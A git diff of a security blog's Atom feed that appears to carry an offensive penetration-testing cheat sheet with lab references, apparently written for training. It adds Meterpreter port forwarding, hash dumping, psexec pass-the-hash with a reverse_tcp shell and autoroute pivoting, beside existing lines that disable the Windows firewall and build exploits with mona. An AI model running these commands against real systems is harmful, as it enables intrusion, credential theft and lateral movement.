@@ -5,7 +5,7 @@
 <link rel="self" type="application/atom+xml" href="https://jivoi.github.io/feed.xml" />
 <link rel="alternate" type="text/html" href="https://jivoi.github.io" />
 <icon>https://i.imgur.com/s7cqI3w.jpg</icon>
-<updated>2015-07-01T12:41:11+03:00</updated>
+<updated>2015-07-01T13:16:15+03:00</updated>
 <id>https://jivoi.github.io/</id>
 <author>
   <name>EK</name>
@@ -48,9 +48,10 @@
       &lt;li&gt;&lt;a href=&quot;#snmp-enumeration&quot; id=&quot;markdown-toc-snmp-enumeration&quot;&gt;SNMP Enumeration&lt;/a&gt;&lt;/li&gt;
       &lt;li&gt;&lt;a href=&quot;#windows-useful-cmds&quot; id=&quot;markdown-toc-windows-useful-cmds&quot;&gt;Windows Useful cmds&lt;/a&gt;&lt;/li&gt;
       &lt;li&gt;&lt;a href=&quot;#putty-link-tunnel&quot; id=&quot;markdown-toc-putty-link-tunnel&quot;&gt;PuTTY Link tunnel&lt;/a&gt;&lt;/li&gt;
+      &lt;li&gt;&lt;a href=&quot;#meterpreter-portfwd&quot; id=&quot;markdown-toc-meterpreter-portfwd&quot;&gt;Meterpreter portfwd&lt;/a&gt;&lt;/li&gt;
       &lt;li&gt;&lt;a href=&quot;#enable-rdp-access&quot; id=&quot;markdown-toc-enable-rdp-access&quot;&gt;Enable RDP Access&lt;/a&gt;&lt;/li&gt;
       &lt;li&gt;&lt;a href=&quot;#turn-off-windows-firewall&quot; id=&quot;markdown-toc-turn-off-windows-firewall&quot;&gt;Turn Off Windows Firewall&lt;/a&gt;&lt;/li&gt;
-      &lt;li&gt;&lt;a href=&quot;#meterpreter-vnc&quot; id=&quot;markdown-toc-meterpreter-vnc&quot;&gt;Meterpreter VNC&lt;/a&gt;&lt;/li&gt;
+      &lt;li&gt;&lt;a href=&quot;#meterpreter-vncrdp&quot; id=&quot;markdown-toc-meterpreter-vncrdp&quot;&gt;Meterpreter VNC\RDP&lt;/a&gt;&lt;/li&gt;
       &lt;li&gt;&lt;a href=&quot;#add-new-user-in-windows&quot; id=&quot;markdown-toc-add-new-user-in-windows&quot;&gt;Add New user in Windows&lt;/a&gt;&lt;/li&gt;
       &lt;li&gt;&lt;a href=&quot;#mimikatz-use&quot; id=&quot;markdown-toc-mimikatz-use&quot;&gt;Mimikatz use&lt;/a&gt;&lt;/li&gt;
       &lt;li&gt;&lt;a href=&quot;#passing-the-hash&quot; id=&quot;markdown-toc-passing-the-hash&quot;&gt;Passing the Hash&lt;/a&gt;&lt;/li&gt;
@@ -208,6 +209,13 @@ C:&lt;span class=&quot;se&quot;&gt;\t&lt;/span&gt;emp&lt;span class=&quot;se&quo
 &lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;Forward remote port to &lt;span class=&quot;nb&quot;&gt;local &lt;/span&gt;address
 plink.exe -P &lt;span class=&quot;m&quot;&gt;22&lt;/span&gt; -l root -pw &lt;span class=&quot;s2&quot;&gt;&amp;quot;1234&amp;quot;&lt;/span&gt; -R 445:127.0.0.1:445 IP&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
 
+&lt;h3 id=&quot;meterpreter-portfwd&quot;&gt;Meterpreter portfwd&lt;/h3&gt;
+
+&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;c&quot;&gt;# https://www.offensive-security.com/metasploit-unleashed/portfwd/&lt;/span&gt;
+&lt;span class=&quot;c&quot;&gt;# forward remote port to local address&lt;/span&gt;
+meterpreter &amp;gt; portfwd add –l &lt;span class=&quot;m&quot;&gt;3389&lt;/span&gt; –p &lt;span class=&quot;m&quot;&gt;3389&lt;/span&gt; –r 172.16.194.141
+kali &amp;gt; rdesktop 127.0.0.1:3389&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
 &lt;h3 id=&quot;enable-rdp-access&quot;&gt;Enable RDP Access&lt;/h3&gt;
 
 &lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;reg add &lt;span class=&quot;s2&quot;&gt;&amp;quot;hklm\system\currentcontrolset\control\terminal server&amp;quot;&lt;/span&gt; /f /v fDenyTSConnections /t REG_DWORD /d 0
@@ -218,9 +226,11 @@ netsh firewall &lt;span class=&quot;nb&quot;&gt;set &lt;/span&gt;service remoted
 
 &lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;netsh firewall &lt;span class=&quot;nb&quot;&gt;set &lt;/span&gt;opmode disable&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
 
-&lt;h3 id=&quot;meterpreter-vnc&quot;&gt;Meterpreter VNC&lt;/h3&gt;
+&lt;h3 id=&quot;meterpreter-vncrdp&quot;&gt;Meterpreter VNC\RDP&lt;/h3&gt;
 
-&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;run getgui -u admin -p 1234
+&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;a
+&lt;span class=&quot;c&quot;&gt;# https://www.offensive-security.com/metasploit-unleashed/enabling-remote-desktop/&lt;/span&gt;
+run getgui -u admin -p 1234
 run vnc -p 5043&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
 
 &lt;h3 id=&quot;add-new-user-in-windows&quot;&gt;Add New user in Windows&lt;/h3&gt;
@@ -242,7 +252,17 @@ pth-winexe -U &lt;span class=&quot;nb&quot;&gt;hash&lt;/span&gt; //IP cmd
 or
 
 apt-get install freerdp-x11
-xfreerdp /u:offsec /d:win2012 /pth:HASH /v:IP&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+xfreerdp /u:offsec /d:win2012 /pth:HASH /v:IP
+
+or
+
+meterpreter &amp;gt; run post/windows/gather/hashdump
+Administrator:500:e52cac67419a9a224a3b108f3fa6cb6d:8846f7eaee8fb117ad06bdd830b7586c:::
+msf &amp;gt; use exploit/windows/smb/psexec
+msf exploit&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;psexec&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &amp;gt; &lt;span class=&quot;nb&quot;&gt;set &lt;/span&gt;payload windows/meterpreter/reverse_tcp
+msf exploit&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;psexec&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &amp;gt; &lt;span class=&quot;nb&quot;&gt;set &lt;/span&gt;SMBPass e52cac67419a9a224a3b108f3fa6cb6d:8846f7eaee8fb117ad06bdd830b7586c
+msf exploit&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;psexec&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &amp;gt; exploit
+meterpreter &amp;gt; shell&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
 
 &lt;h3 id=&quot;hashcat-password-cracking&quot;&gt;Hashcat password cracking&lt;/h3&gt;
 
@@ -357,10 +377,25 @@ proxychains commands target&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
 
 &lt;h3 id=&quot;pivoting-using-metasploit&quot;&gt;Pivoting Using metasploit&lt;/h3&gt;
 
-&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;route add IP 255.255.255.0 1
+&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;route add X.X.X.X 255.255.255.0 1
 use auxiliary/server/socks4a
 run
-proxychains msfcli windows/* &lt;span class=&quot;nv&quot;&gt;PAYLOAD&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;windows/meterpreter/reverse_tcp &lt;span class=&quot;nv&quot;&gt;LHOST&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;IP &lt;span class=&quot;nv&quot;&gt;LPORT&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;443&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;RHOST&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;IP E&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+proxychains msfcli windows/* &lt;span class=&quot;nv&quot;&gt;PAYLOAD&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;windows/meterpreter/reverse_tcp &lt;span class=&quot;nv&quot;&gt;LHOST&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;IP &lt;span class=&quot;nv&quot;&gt;LPORT&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;443&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;RHOST&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;IP E
+
+or
+
+&lt;span class=&quot;c&quot;&gt;# https://www.offensive-security.com/metasploit-unleashed/pivoting/&lt;/span&gt;
+meterpreter &amp;gt; ipconfig
+IP Address  : 10.1.13.3
+meterpreter &amp;gt; run autoroute -s 10.1.13.0/24
+meterpreter &amp;gt; run autoroute -p
+10.1.13.0          255.255.255.0      Session 1
+meterpreter &amp;gt; Ctrl+Z
+msf auxiliary&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;tcp&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &amp;gt; use exploit/windows/smb/psexec
+msf exploit&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;psexec&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &amp;gt; &lt;span class=&quot;nb&quot;&gt;set &lt;/span&gt;RHOST 10.1.13.2
+msf exploit&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;psexec&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &amp;gt; exploit
+meterpreter &amp;gt; ipconfig
+IP Address  : 10.1.13.2&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
 
 &lt;h3 id=&quot;exploit-db-search-using-csv-file&quot;&gt;Exploit-DB search using CSV File&lt;/h3&gt;
 
@@ -483,7 +518,7 @@ add garbage upto EIP value and add &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt
 
 &lt;h3 id=&quot;seh---structured-exception-handling&quot;&gt;SEH - Structured Exception Handling&lt;/h3&gt;
 
-&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;https://en.wikipedia.org/wiki/Microsoft-specific_exception_handling_mechanisms#SEH
+&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;c&quot;&gt;# https://en.wikipedia.org/wiki/Microsoft-specific_exception_handling_mechanisms#SEH&lt;/span&gt;
 !mona suggest
 !mona nosafeseh
 &lt;span class=&quot;nv&quot;&gt;nseh&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&amp;quot;\xeb\x06\x90\x90&amp;quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;next seh chain&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
@@ -491,21 +526,21 @@ add garbage upto EIP value and add &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt
 
 &lt;h3 id=&quot;rop-dep&quot;&gt;ROP (DEP)&lt;/h3&gt;
 
-&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;https://en.wikipedia.org/wiki/Return-oriented_programming
-https://en.wikipedia.org/wiki/Data_Execution_Prevention
+&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;c&quot;&gt;# https://en.wikipedia.org/wiki/Return-oriented_programming&lt;/span&gt;
+&lt;span class=&quot;c&quot;&gt;# https://en.wikipedia.org/wiki/Data_Execution_Prevention&lt;/span&gt;
 !mona modules
 !mona ropfunc -m *.dll -cpb &lt;span class=&quot;s2&quot;&gt;&amp;quot;\x00\x09\x0a&amp;quot;&lt;/span&gt;
 !mona rop -m *.dll -cpb &lt;span class=&quot;s2&quot;&gt;&amp;quot;\x00\x09\x0a&amp;quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;auto suggest&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
 
 &lt;h3 id=&quot;aslr---address-space-layout-randomization&quot;&gt;ASLR - Address space layout randomization&lt;/h3&gt;
 
-&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;https://en.wikipedia.org/wiki/Address_space_layout_randomization
+&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;c&quot;&gt;# https://en.wikipedia.org/wiki/Address_space_layout_randomization&lt;/span&gt;
 !mona noaslr&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
 
 &lt;h3 id=&quot;egg-hunter-techniques&quot;&gt;EGG Hunter techniques&lt;/h3&gt;
 
-&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;https://www.corelan.be/index.php/2010/01/09/exploit-writing-tutorial-part-8-win32-egg-hunting/
-http://www.fuzzysecurity.com/tutorials/expDev/4.html
+&lt;div class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;c&quot;&gt;# https://www.corelan.be/index.php/2010/01/09/exploit-writing-tutorial-part-8-win32-egg-hunting/&lt;/span&gt;
+&lt;span class=&quot;c&quot;&gt;# http://www.fuzzysecurity.com/tutorials/expDev/4.html&lt;/span&gt;
 !mona jmp -r esp
 !mona egg -t lxxl
 &lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;eb&lt;span class=&quot;se&quot;&gt;\x&lt;/span&gt;c4 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;jump backward -60&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
